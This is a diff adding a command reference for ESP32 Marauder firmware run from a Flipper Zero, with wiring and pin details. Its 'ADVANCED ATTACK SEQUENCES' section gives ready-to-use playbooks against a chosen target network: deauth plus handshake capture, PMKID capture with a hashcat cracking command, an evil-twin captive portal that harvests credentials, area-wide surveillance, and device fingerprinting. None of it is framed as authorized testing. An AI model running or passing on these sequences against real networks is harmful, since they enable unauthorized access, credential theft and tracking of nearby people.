@@ -1,0 +1,181 @@
+# ============================================================================
+#  FLLC - FU PERSON | ESP32 Advanced GPIO Commands & Configs
+# ============================================================================
+#  Extended command reference for ESP32 Marauder and custom firmware
+#  connected via Flipper Zero GPIO UART bridge.
+# ============================================================================
+
+# ============================================================================
+#  CONNECTION SETUP
+# ============================================================================
+#
+#  WIRING (Flipper Zero -> ESP32 DevKit V1.1):
+#    Flipper TX  (pin 13) -> ESP32 RX (GPIO 3 / RXD0)
+#    Flipper RX  (pin 14) -> ESP32 TX (GPIO 1 / TXD0)
+#    Flipper GND (pin 18) -> ESP32 GND
+#    Flipper 5V  (pin 1)  -> ESP32 VIN (if powering from Flipper)
+#    OR: Power ESP32 via its own USB (recommended for stability)
+#
+#  FLIPPER SIDE:
+#    GPIO -> UART Bridge -> Baud: 115200
+#    OR: Install "ESP32 WiFi Marauder" app (Momentum/Unleashed)
+#
+#  SERIAL SETTINGS:
+#    Baud: 115200
+#    Data bits: 8
+#    Stop bits: 1
+#    Parity: None
+#    Flow control: None
+
+# ============================================================================
+#  FULL MARAUDER COMMAND REFERENCE
+# ============================================================================
+#
+# --- SCANNING ---
+#  scanap                    Scan for WiFi access points
+#  scanap -c <ch>            Scan specific channel
+#  scanap -t <seconds>       Scan with timeout
+#  scansta                   Scan for WiFi stations (clients)
+#  scansta -c <ch>           Scan clients on channel
+#  scan ble                  Scan BLE devices
+#  scan ble <seconds>        Scan BLE with timeout
+#  sniff probes              Capture probe requests
+#  sniff beacon              Capture beacon frames
+#  sniff deauth              Detect deauth frames
+#  sniff esp                 Sniff ESP-NOW packets
+#  sniff pmkid               Capture PMKID hashes
+#  sniff pwnagotchi          Detect Pwnagotchi devices
+#  stopscan                  Stop all scanning
+#
+# --- ATTACKS ---
+#  attack -t deauth          Deauth selected APs
+#  attack -t deauth -c <ch>  Deauth on specific channel
+#  attack -t beacon          Beacon spam (random SSIDs)
+#  attack -t beacon -l       Beacon spam (from list)
+#  attack -t rickroll        Beacon spam with funny SSIDs
+#  attack -t probe           Probe request flood
+#  attack -t rogue           Rogue AP (Evil Twin)
+#  attack -t rogue -s "SSID" Rogue AP with specific name
+#  attack -t karma           Karma attack (respond to all probes)
+#  stopattack                Stop all attacks
+#
+# --- SELECTION ---
+#  select ap <index>         Select AP by scan index
+#  select ap -a              Select all APs
+#  select ap -f <filter>     Select APs matching filter
+#  select sta <index>        Select station by index
+#  select sta -a             Select all stations
+#  clearlist ap              Clear AP selection
+#  clearlist sta             Clear station selection
+#
+# --- DISPLAY ---
+#  list ap                   Show discovered APs
+#  list sta                  Show discovered stations
+#  list probes               Show captured probes
+#  list creds                Show captured credentials
+#  list ssid                 Show SSID list
+#  status                    System status
+#  info                      Firmware info
+#
+# --- SSID MANAGEMENT ---
+#  ssid -a "NetworkName"     Add SSID to list
+#  ssid -r <index>           Remove SSID from list
+#  ssid -g <count>           Generate random SSIDs
+#  ssid -c                   Clear SSID list
+#
+# --- PCAP ---
+#  pcap start                Start PCAP capture to SD
+#  pcap stop                 Stop PCAP capture
+#  pcap clear                Clear PCAP buffer
+#
+# --- CHANNEL ---
+#  channel <1-14>            Set WiFi channel
+#  channel -h                Enable channel hopping
+#  channel -r                Random channel hopping
+#
+# --- SD CARD ---
+#  save                      Save all data to SD
+#  save ap                   Save AP list
+#  save sta                  Save station list
+#  save probes               Save probe requests
+#  save pcap                 Save PCAP file
+#  ls                        List SD card files
+#  cat <filename>            Read file from SD
+#
+# --- SYSTEM ---
+#  reboot                    Restart ESP32
+#  update                    OTA update mode
+#  led <r> <g> <b>           Set LED color (if available)
+#  gps                       Show GPS data (if GPS module)
+
+# ============================================================================
+#  ADVANCED ATTACK SEQUENCES
+# ============================================================================
+#
+# --- SEQUENCE: TARGETED DEAUTH + HANDSHAKE CAPTURE ---
+#  scanap                    # Discover networks
+#  # (identify target network index)
+#  select ap 3               # Select target
+#  pcap start                # Begin capture
+#  attack -t deauth          # Force clients to reconnect
+#  # (wait 30-60 seconds)
+#  pcap stop                 # Stop capture
+#  save pcap                 # Save PCAP (contains handshake)
+#  # Extract with: aircrack-ng or hashcat
+#
+# --- SEQUENCE: PMKID HASH CAPTURE (No client needed!) ---
+#  scanap                    # Discover networks
+#  select ap 3               # Select target
+#  sniff pmkid               # Capture PMKID from AP
+#  # (wait for "PMKID captured" message)
+#  save                      # Save to SD
+#  # Crack with: hashcat -m 22000 pmkid.hc22000 wordlist.txt
+#
+# --- SEQUENCE: FULL AREA SURVEILLANCE ---
+#  scanap -t 30              # 30s AP scan
+#  scansta -t 30             # 30s client scan
+#  sniff probes              # Continuous probe sniffing
+#  scan ble 30               # 30s BLE scan
+#  save                      # Save everything
+#  # Now you know: all networks, all devices, all probes, all BLE
+#
+# --- SEQUENCE: EVIL TWIN CREDENTIAL HARVEST ---
+#  scanap                    # Discover networks
+#  select ap 3               # Select target
+#  attack -t deauth          # Kick everyone off
+#  # (wait 10s)
+#  stopattack                # Stop deauth
+#  attack -t rogue -s "TargetSSID"  # Clone network
+#  # (captive portal captures credentials)
+#  list creds                # View captured creds
+#  save                      # Save to SD
+#
+# --- SEQUENCE: BLE + WIFI COMBINED RECON ---
+#  scanap                    # WiFi APs
+#  scan ble 60               # Long BLE scan
+#  sniff probes              # Probe requests
+#  # Cross-reference: BLE device MACs with WiFi client MACs
+#  # Many phones broadcast on both = device fingerprinting
+#  save                      # Save all data
+
+# ============================================================================
+#  ESP32 DEVKIT V1.1 (DIYMalls) PIN REFERENCE
+# ============================================================================
+#
+#  PIN  | GPIO | FUNCTION FOR FLLC WARDRIVER
+#  -----|------|------------------------------
+#  VIN  | -    | 5V power input (from Flipper or USB)
+#  GND  | -    | Ground
+#  D1   | TX0  | UART TX -> Flipper RX (pin 14)
+#  D3   | RX0  | UART RX -> Flipper TX (pin 13)
+#  D5   | 5    | SD Card CS (if using SD breakout)
+#  D18  | 18   | SD Card SCK
+#  D19  | 19   | SD Card MISO
+#  D23  | 23   | SD Card MOSI
+#  D2   | 2    | Onboard LED (status indicator)
+#  D4   | 4    | GPS TX (if GPS module connected)
+#  D15  | 15   | GPS RX
+#  EN   | -    | Enable/Reset (pull LOW to reset)
+#
+#  IMPORTANT: GPIO 6-11 are used for internal flash. Do NOT use them.
+#  GPIO 34-39 are input-only (no internal pull-ups).
